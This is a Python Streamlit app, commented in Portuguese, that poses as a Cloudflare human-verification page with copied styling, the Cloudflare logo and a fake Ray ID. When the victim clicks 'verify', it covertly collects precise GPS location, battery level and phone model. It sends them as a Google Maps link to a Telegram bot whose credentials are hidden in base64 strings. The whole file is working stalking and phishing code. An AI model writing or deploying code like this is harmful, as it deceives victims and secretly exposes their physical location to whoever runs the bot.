import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- 1. CONFIGURAÇÃO DA PÁGINA ---
st.set_page_config(page_title="Just a moment...", page_icon="☁️", layout="centered")

# --- 2. SEUS DADOS DO TELEGRAM ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

# --- 3. ESTILO CSS (VISUAL CLOUDFLARE) ---
st.markdown("""
    <style>
        /* Fundo Preto Total */
        .stApp { background-color: #1d1d1d !important; color: #d9d9d9 !important; }
        
        /* Esconder cabeçalho e rodapé do Streamlit */
        header {visibility: hidden;}
        footer {visibility: hidden;}
        .stDeployButton {display:none;}
        
        /* Título Principal */
        .site-header { 
            font-family: system-ui, -apple-system, sans-serif; 
            font-size: 30px; 
            font-weight: 500; 
            margin-bottom: 10px; 
            color: #fff;
        }
        
        /* Texto Descritivo */
        .desc-text { 
            color: #d9d9d9; 
            font-family: system-ui, sans-serif; 
            font-size: 16px; 
            line-height: 1.6; 
            margin-bottom: 30px; 
        }
        
        /* Caixa da Cloudflare */
        .cf-box {
            background-color: #2c2c2c; 
            border: 1px solid #444;
            color: #d9d9d9;
            padding: 15px 20px;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            max-width: 100%;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        
        /* Checkbox Simulado */
        .cf-checkbox {
            width: 30px;
            height: 30px;
            background-color: #1d1d1d;
            border: 2px solid #555;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
        }
        
        /* Texto do Label */
        .cf-label { font-family: system-ui, sans-serif; font-size: 16px; font-weight: 500; }
        
        /* Logo */
        .cf-logo { height: 25px; opacity: 0.7; }

        /* Estilo do Botão Streamlit (Invisível por cima) */
        .stButton > button {
            width: 100%;
            background-color: #3b82f6; 
            color: white;
            border: none;
            padding: 12px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
        }
        .stButton > button:hover { background-color: #2563eb; }
        
        /* Animação de Carregamento (Spinner) */
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-left-color: #3b82f6;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
""", unsafe_allow_html=True)

# --- 4. FUNÇÃO DE ENVIO ---
def enviar_telegram(msg):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{tk}/sendMessage", 
                      json={"chat_id": ci, "text": msg, "parse_mode": "Markdown"}, timeout=10)
    except: pass

# --- 5. CONTROLE DE ESTADO (MEMÓRIA) ---
if 'status' not in st.session_state:
    st.session_state['status'] = 'desafio' 

# --- 6. CABEÇALHO DO SITE ---
st.markdown('<div class="site-header">www.verificacaodeseguranca.com.br</div>', unsafe_allow_html=True)
st.markdown('<div class="desc-text">Este site utiliza um serviço de segurança para proteção contra bots maliciosos.<br>Esta página é exibida enquanto o site verifica se você não é um bot.</div>', unsafe_allow_html=True)

# --- 7. LÓGICA PRINCIPAL (AQUI ESTAVA O ERRO, AGORA CORRIGIDO) ---

# FASE 1: DESAFIO (BOTÃO)
if st.session_state['status'] == 'desafio':
    st.markdown("""
    <div class="cf-box">
        <div style="display:flex; align-items:center;">
            <div class="cf-checkbox"></div>
            <span class="cf-label">Verifique se você é humano</span>
        </div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo">
    </div>
    """, unsafe_allow_html=True)
    
    if st.button("Clique aqui para Verificar"):
        st.session_state['status'] = 'verificando'
        st.rerun()

# FASE 2: VERIFICANDO (PROCESSAMENTO + GPS)
elif st.session_state['status'] == 'verificando':
    # Mostra caixa girando
    st.markdown("""
    <div class="cf-box">
        <div style="display:flex; align-items:center;">
            <div class="cf-checkbox" style="border:none;"><div class="spinner"></div></div>
            <span class="cf-label">Verificando...</span>
        </div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo">
    </div>
    """, unsafe_allow_html=True)

    # Coleta de dados
    ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_DATA")
    bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_DATA")
    
    # Script GPS (Sem botão, automático)
    js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('erro'); }, {enableHighAccuracy:true, timeout:8000}); })"
    posicao = streamlit_js_eval(js_expressions=js_gps, key=f"GPS_CHECK_{int(time.time())}")

    if posicao:
        if posicao == "erro":
            st.error("Falha. Ative o GPS e recarregue.")
            time.sleep(3)
            st.session_state['status'] = 'desafio'
            st.rerun()
        else:
            # SUCESSO - Envia Telegram
            modelo = "Android Generico"
            if ua:
                try:
                    info = ua.split("(")[1].split(")")[0]
                    for p in info.split(";"):
                        if any(x in p for x in ["SM-", "POCO", "A11", "Xiaomi", "Samsung", "M6"]):
                            modelo = p.strip()
                            break
                except: pass
            
            link = f"https://www.google.com/maps?q={posicao}"
            relatorio = (
                f"🛡️ *CLOUDFLARE VERIFIED*\n"
                f"📱 *Device:* {modelo}\n"
                f"🔋 *Bat:* {bat}%\n"
                f"📍 *Loc:* {link}"
            )
            enviar_telegram(relatorio)
            
            st.session_state['status'] = 'sucesso'
            st.rerun()

# FASE 3: SUCESSO (TELA VERDE)
elif st.session_state['status'] == 'sucesso':
    st.markdown("""
    <div class="cf-box" style="border-color: #10b981;">
        <div style="display:flex; align-items:center;">
            <div style="font-size:24px; margin-right:15px;">✅</div>
            <span class="cf-label" style="color:#10b981;">Verificação bem-sucedida.</span>
        </div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo">
    </div>
    <div class="desc-text" style="font-size:14px; margin-top:0;">Aguardando resposta de www.verificacaodeseguranca.com.br...</div>
    """, unsafe_allow_html=True)

# RODAPÉ
st.markdown('<div style="text-align:center; color:#555; font-size:12px; margin-top:50px;">Ray ID: 7d8f9a1b2c3d • Miamy Security © 2026</div>', unsafe_allow_html=True)
                
